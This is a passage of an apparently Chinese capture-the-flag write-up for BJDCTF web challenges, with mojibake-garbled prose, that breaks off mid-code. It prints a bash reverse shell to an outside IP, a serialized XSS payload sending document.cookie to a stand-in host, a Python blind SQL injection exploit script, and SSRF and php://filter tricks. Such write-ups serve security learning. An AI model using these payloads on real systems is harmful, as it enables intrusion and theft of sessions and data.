-r</code>æ¢å¤å¾—åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;how can i give you source code? .swp?!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">&#x27;girl_friend&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;where is P3rh4ps&#x27;s girl friend ???&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $girl = $_POST[<span class="string">&#x27;girl_friend&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/\&gt;|\\\/&#x27;</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;just girl&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&#x27;</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;img/p3_need_beautiful_gf.png&#x27;&gt; &lt;!-- He is p3 --&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//duangShell~~~~</span></span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ²¡è¿‡æ»¤ç®¡é“å’Œç©ºæ ¼</p><p>ç”±äºbuué¶æœºä¸èƒ½è®¿é—®å†…ç½‘ï¼Œæ–°å»ºä¸€ä¸ªå°å·å»basicé‡Œæ‰¾åˆ°linux-labs</p><p>æ–°å»ºä¸€ä¸ªindex.php,å†™å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;174.1.55.214&#x2F;2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>ç„¶åèµ·ä¸€ä¸ªwebæœåŠ¡</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 0.0.0.0:8000</span><br></pre></td></tr></table></figure><p>ncç›‘å¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 2333</span><br></pre></td></tr></table></figure><img src="/2020/03/21/BJDCTF-2rd-writeup/TIMæˆªå›¾20200321195223.png" style="zoom:80%;"><img src="/2020/03/21/BJDCTF-2rd-writeup/TIMæˆªå›¾20200321195320.png" style="zoom:80%;"><h3 id="xssä¹‹å…‰"><a href="#xssä¹‹å…‰" class="headerlink" title="xssä¹‹å…‰"></a>xssä¹‹å…‰</h3><p>æ‰«ç›®å½•å‘ç°.gitæºç æ³„éœ²ï¼Œæ¢å¤æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">&#x27;yds_is_so_beautiful&#x27;</span>];</span><br><span class="line">$b = unserialize($a);</span><br></pre></td></tr></table></figure><p>é¢˜ç›®è€ƒå¯Ÿçš„çŸ¥è¯†ç‚¹æ˜¯phpåŸç”Ÿç±»ååºåˆ—åŒ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a =<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;window.open(&#x27;http://vps/?a=&#x27;+document.cookie)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br></pre></td></tr></table></figure><img src="/2020/03/21/BJDCTF-2rd-writeup/TIMæˆªå›¾20200324172728.png" style="zoom:80%;"><h3 id="ç®€å•æ³¨å…¥"><a href="#ç®€å•æ³¨å…¥" class="headerlink" title="ç®€å•æ³¨å…¥"></a>ç®€å•æ³¨å…¥</h3><p>fuzzä¸€æ³¢å‘ç°è¿‡æ»¤äº†å¥½å¤šä¸œè¥¿</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIMæˆªå›¾20200322153408.png" style="zoom:80%;"><p>union select å•åŒå¼•å· =å·éƒ½è¿‡æ»¤äº†</p><p>æ‰«è·¯å¾„æ‰«åˆ°robots.txtlé‡Œé¢hint.txté‡Œæœ‰</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">where</span> username=<span class="string">&#x27;$_POST[&quot;username&quot;]&#x27;</span> <span class="keyword">and</span> <span class="keyword">password</span>=<span class="string">&#x27;$_POST[&quot;password&quot;]&#x27;</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°±å¯ä»¥åŠ ä¸ªè½¬ä¹‰ç¬¦å·</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username&#x3D;&#39;admin\&#39; and password&#x3D;&#39;$password&#39;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶usernameçš„å€¼å°±è¢«è®¤ä¸ºæ˜¯<code>admin\&#39; and password=</code></p><p><code>$password</code>ä¼  <code>or sleep(3)%23</code>å‘ç°èƒ½å¤Ÿå»¶æ—¶ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨sleep(3)ä¼ å…¥æ³¨å…¥è¯­å¥</p><p><strong>payload:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or if((ascii(substr((&#123;1&#125;),&#123;&#125;,1)) regexp &#123;&#125;),1,0)#</span><br></pre></td></tr></table></figure><p>ç”±äºè¡¨ä¸­åªæœ‰ä¸€æ¡æ•°æ®ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨1ä½ç½®ç›´æ¥ä¼ å­—æ®µçš„åå­—å°±èƒ½è·‘å‡ºæ•°æ®äº†</p><p>ç®€å•åšä¸ªå®éªŒ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">test</span> (<span class="keyword">id</span> <span class="built_in">int</span>(<span class="number">10</span>),username <span class="built_in">varchar</span>(<span class="number">50</span>),<span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">50</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">test</span> (<span class="keyword">id</span>,username,<span class="keyword">password</span>) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2020/03/21/BJDCTF-2rd-writeup/TIMæˆªå›¾20200322185056.png" style="zoom: 67%;"><p>å‘ç°æ’å…¥å¤šæ¡æ•°æ®ä¹Ÿå¯ä»¥è¿™æ ·ç”¨,ä½†æ˜¯æœ‰ç›¸ä¼¼çš„è¯å°±ä¼šæŸ¥å‡ºå¤šæ¡æ•°æ®</p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIMæˆªå›¾20200322193353.png" style="zoom: 67%;"><p>å†™äº†ä¸ªexpï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://b4b1391f-dea5-4d42-8e61-f68b27487be2.node3.buuoj.cn&#x27;</span></span><br><span class="line">proxies=&#123;</span><br><span class="line"><span class="string">&#x27;http&#x27;</span>:<span class="string">&quot;http://127.0.0.1:8080&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sqlin</span>(<span class="params">sql</span>):</span></span><br><span class="line">database=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">f1=database</span><br><span class="line">top=<span class="number">127</span></span><br><span class="line">low=<span class="number">33</span></span><br><span class="line"><span class="keyword">while</span> low&lt;=top:</span><br><span class="line">mid=(top+low)//<span class="number">2</span></span><br><span class="line">data1=&#123;</span><br><span class="line"><span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27; or if((ascii(substr((&#123;&#125;),&#123;&#125;,1)) &gt; &#123;&#125;),1,0)#&#x27;</span>.format(sql,str(i),str(mid))</span><br><span class="line">&#125;</span><br><span class="line">data2=&#123;</span><br><span class="line"><span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin\\&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27; or if((ascii(substr((&#123;&#125;),&#123;&#125;,1)) regexp &#123;&#125;),1,0)#&#x27;</span>.format(sql,str(i),str(mid))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">r1=requests.post(url,data=data2)</span><br><span class="line">print(i,mid)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;BJD needs to be stronger&#x27;</span> <span class="keyword">in</span> r1.text:</span><br><span class="line">database+=chr(mid)</span><br><span class="line">print(database)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">r=requests.post(url,data=data1)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;BJD needs to be stronger&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">low=mid+<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;P3rh4ps&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">top=mid<span class="number">-1</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> database==f1:</span><br><span class="line">print(database)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="comment"># database=&#x27;p3rh4ps&#x27;</span></span><br><span class="line">sql0=<span class="string">&#x27;database()&#x27;</span></span><br><span class="line">sql1=<span class="string">&#x27;username&#x27;</span></span><br><span class="line">sqlin(sql1)</span><br></pre></td></tr></table></figure><h3 id="æ–‡ä»¶æ¢æµ‹"><a href="#æ–‡ä»¶æ¢æµ‹" class="headerlink" title="æ–‡ä»¶æ¢æµ‹"></a>æ–‡ä»¶æ¢æµ‹</h3><p>æŠ“åŒ…ï¼Œçœ‹åˆ°httpå¤´é‡Œæœ‰<code>hint:home.php</code></p><p>è®¿é—®ä¼šè·³è½¬åˆ°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">home.php?file=system</span><br></pre></td></tr></table></figure><p><code>php://filter</code>è¯»æºç ï¼Œ<code>system.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">home.php?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=system</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;y1ng&#x27;</span>]) || $_COOKIE[<span class="string">&#x27;y1ng&#x27;</span>] !== sha1(md5(<span class="string">&#x27;y1ng&#x27;</span>)))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;why you are here!&#x27;);alert(&#x27;fxck your scanner&#x27;);alert(&#x27;fxck you! get out!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">    header(<span class="string">&quot;Refresh:0.1;url=index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line">$str2 = <span class="string">&#x27;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;url invalid&lt;br&gt;~$ &#x27;</span>;</span><br><span class="line">$str3 = <span class="string">&#x27;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;damn hacker!&lt;br&gt;~$ &#x27;</span>;</span><br><span class="line">$str4 = <span class="string">&#x27;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Error:&amp;nbsp;&amp;nbsp;request method error&lt;br&gt;~$ &#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$filter1 = <span class="string">&#x27;/^http:\/\/127\.0\.0\.1\//i&#x27;</span>;</span><br><span class="line">$filter2 = <span class="string">&#x27;/.?f.?l.?a.?g.?/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;q1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;q2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;q3&#x27;</span>]) ) &#123;</span><br><span class="line">    $url = $_POST[<span class="string">&#x27;q2&#x27;</span>].<span class="string">&quot;.y1ng.txt&quot;</span>;</span><br><span class="line">    $method = $_POST[<span class="string">&#x27;q3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    $str1 = <span class="string">&quot;~$ python fuck.py -u \&quot;&quot;</span>.$url .<span class="string">&quot;\&quot; -M <span class="subst">$method</span> -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $str1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        <span class="keyword">die</span>($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match($filter2, $url)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/^GET/i&#x27;</span>, $method) &amp;&amp; !preg_match(<span class="string">&#x27;/^POST/i&#x27;</span>, $method)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect = @file_get_contents($url, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">print</span>(sprintf(<span class="string">&quot;<span class="subst">$url</span> method&amp;content_size:<span class="subst">$method</span>%d&quot;</span>, $detect));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>home.php:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">&quot;y1ng&quot;</span>, sha1(md5(<span class="string">&#x27;y1ng&#x27;</span>)), time() + <span class="number">3600</span>);</span><br><span class="line">setcookie(<span class="string">&#x27;your_ip_address&#x27;</span>, md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]), time()+<span class="number">3600</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&quot;/\^|\~|&amp;|\|/&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;forbidden&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?f.?l.?a.?g.?/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/.?a.?d.?m.?i.?n.?/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;You! are! not! my! admin!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/^home$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;ç¦æ­¢å¥—å¨ƒ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/home$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]) <span class="keyword">or</span> preg_match(<span class="string">&quot;/system$/i&quot;</span>, $_GET[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">            $file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $file = $_GET[<span class="string">&#x27;file&#x27;</span>].<span class="string">&quot;.fxxkyou!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ç°åœ¨è®¿é—®çš„æ˜¯ &quot;</span>.$file . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">require</span> $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;./home.php?file=system&#x27;&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰ä¸ª<code>admin.php</code>ï¼Œè¯•ç€è®¿é—®ä¸€ä¸‹</p><p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIM%E6%88%AA%E5%9B%BE20200323143502.png"></p><p>å¥½åƒæ²¡å•¥æ€è·¯äº†ï¼Œå†çœ‹ä¸‹<code>system.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$detect = @file_get_contents($url, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">print</span>(sprintf(<span class="string">&quot;<span class="subst">$url</span> method&amp;content_size:<span class="subst">$method</span>%d&quot;</span>, $detect));</span><br></pre></td></tr></table></figure><p>å’Œæå®¢å¤§æŒ‘æˆ˜çš„æŸé¢˜å¾ˆç±»ä¼¼ï¼Œæˆ‘ä»¬åªéœ€åœ¨<code>$method</code>ä¼ <code>%s%</code>å°†<code>%d</code>è½¬ä¹‰å°±è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è¿™æ ·æ„é€ </p><img src="/2020/03/21/BJDCTF-2rd-writeup/TIMæˆªå›¾20200323150943.png" style="zoom:80%;"><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»ssrfè¯»å–åˆ°admin.phpäº†ï¼Œæºç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$f1ag = <span class="string">&#x27;f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;&#x27;</span>; <span class="comment">//fake</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span>(<span class="params">$data, $key</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $method = <span class="string">&#x27;AES-128-CBC&#x27;</span>;</span><br><span class="line">    $iv = md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;your_ip_address&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="string">&#x27;your_ip_address&#x27;</span>] === md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &amp;&amp; $_COOKIE[<span class="string">&#x27;y1ng&#x27;</span>] === sha1(md5(<span class="string">&#x27;y1ng&#x27;</span>)))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] == <span class="string">&quot;127.0.0.1&quot;</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size=&#x27;10px&#x27; color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is &quot;</span> . $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">$_SESSION[<span class="string">&#x27;user&#x27;</span>] = md5($_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;decrypt&#x27;</span>])) &#123;</span><br><span class="line">    $decr = $_GET[<span class="string">&#x27;decrypt&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (Check())&#123;</span><br><span class="line">        $data = $_SESSION[<span class="string">&#x27;secret&#x27;</span>];</span><br><span class="line">        <span class="keyword">include</span> <span class="string">&#x27;flag_2sln2ndln2klnlksnf.php&#x27;</span>;</span><br><span class="line">        $cipher = aesEn($data, <span class="string">&#x27;y1ng&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> ($decr === $cipher)&#123;</span><br><span class="line">            <span class="keyword">echo</span> WHAT_YOU_WANT;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;çˆ¬&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">&quot;Refresh:0.1;url=index.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//I heard you can break PHP mt_rand seed</span></span><br><span class="line">    mt_srand(rand(<span class="number">0</span>,<span class="number">9999999</span>));</span><br><span class="line">    $length = mt_rand(<span class="number">40</span>,<span class="number">80</span>);</span><br><span class="line">    $_SESSION[<span class="string">&#x27;secret&#x27;</span>] = bin2hex(random_bytes($length));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>çœ‹äº†çœ‹åé¢çš„éšæœºæ•°ç”Ÿæˆçš„ä»£ç ï¼Œå‘ç°åº”è¯¥æ²¡æœ‰æ–¹æ³•æš´åŠ›ç ´è§£å‡ºæ¥</p><p>ä»”ç»†çœ‹çœ‹ï¼Œå‘ç°å¦‚æœç¬¬ä¸€æ¬¡æˆ‘ä»¬è®¾ç½®äº†<code>decrypt</code>ï¼Œ<code>$_SESSION[&#39;secret&#39;]</code>å°±ä¸ºç©ºï¼Œå³<code>$data</code>ä¸ºç©º</p><p>è€Œ<code>Cheak()</code>å‡½æ•°æ˜¯å¾ˆå¥½ç»•è¿‡çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ :</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 